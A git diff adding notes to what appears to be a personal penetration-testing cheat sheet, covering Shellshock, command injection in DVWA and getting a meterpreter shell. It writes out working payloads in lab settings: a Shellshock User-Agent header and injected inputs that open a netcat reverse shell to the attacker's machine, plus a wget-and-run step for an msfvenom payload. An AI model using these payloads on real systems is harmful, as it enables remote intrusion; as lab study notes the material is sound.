@@ -15,6 +15,7 @@
 | md5sum *file* | Gives the md5sum hash of the *file* |
 | cat *filename* | Print file contents on terminal | 
 | systemctl start apache2 | systemctl?? | 
+| ping *ip* -c **n** | Pings *ip* **n** number of times | 
 
 Apache2 files : /var/www/html
 
@@ -276,7 +277,7 @@ Run : **resource *rc* file generated**, in msfconsole for listening
 ## B2E
 	
 	Tool for converting .bat file to .exe
-	
+
 	Download from Github. It is an exe file...have to run with wine.
 
 
@@ -352,6 +353,8 @@ To prevent manually forwarding packets: Turn Intercept Off in the suite.
 
 ## ShellShock (2014)
 
+### Manually
+
 - Google -> pentesterlab shellshock
 - Files -> Download ISO
 - Create virtual machine using ISO (Linux, Other linux 32bit)
@@ -361,4 +364,61 @@ To prevent manually forwarding packets: Turn Intercept Off in the suite.
 - Go to the ip of the VM in firefox
 - Find the cgi script in burpsuite
 - Click on response (The output is similar to *uname -a*)
-- 
+- User agent field in the request is an environmental variable
+- Empty function syntax: 
+	- () { :;};
+	When bash gets this empty function it accepts the variable after it and runs it as a command on the server (The shellshock vulnerability)
+- We must change the user agent to the empty function syntax + our command and then send the request
+- Select the request
+- Right click
+- Click Send to repeater
+- Change User agent to:
+	- Example:
+		() { :;}; /bin/bash -c 'nc *ip of kali machine* *port* -e /bin/bash'
+- Set up listener:
+	nc -lvp *port*
+- Send the request in burpsuite
+
+### Automating it with metasploit:
+
+- search shellshock
+- use exploit/multi/http/apache_mod_cgi_bash_env_exec
+- set options and run
+	- TARGETURI : /cgi-bin/status (Check the first line of GET request)
+	- set RPATH : /bin 
+
+## Command injection
+
+*Turn on burpsuite if it is set as proxy*
+
+- Type ip of metasploitable machine in browser
+- Open DVWA
+- Set security to low in DVWA security
+- Go to Command exection section
+- We can attach another command with the ip :
+	- eg: 
+		- 192.168.1.1;ls -la
+		- 192.168.1.1;whoami
+		- To avoid waiting for ping command to finish simply use: ;ls -la
+- nc -lvp *port* : Starting listener
+- Go to command execution section and use: *ip*;nc -e /bin/bash *ip of kali machine* *port*
+	- eg: 192.168.1.1;nc -e /bin/bash 192.168.1.9 12345
+
+Two commands can also be run like : command1 && command2
+Two commands can also be run like : command1 & command2 *(But they are executed as two different processes)*
+Two commands can also be run like : command1 | command2
+
+## Getting meterpreter shell with command execution
+
+- Create python payload with msfvenom
+- Host the payload in apache
+	- sudo service apache2 start
+	- /var/www/html : copy payload here
+- Open command injection of DVWA after changing security level to low or medium
+- wget *kali ip/payload* : This will download the payload
+- So use the same after ;
+- It should have been downloaded to target directory
+- Set up listener in msfconsole
+- Use command injection to run payload in target:
+	- ;python *python payload*
+
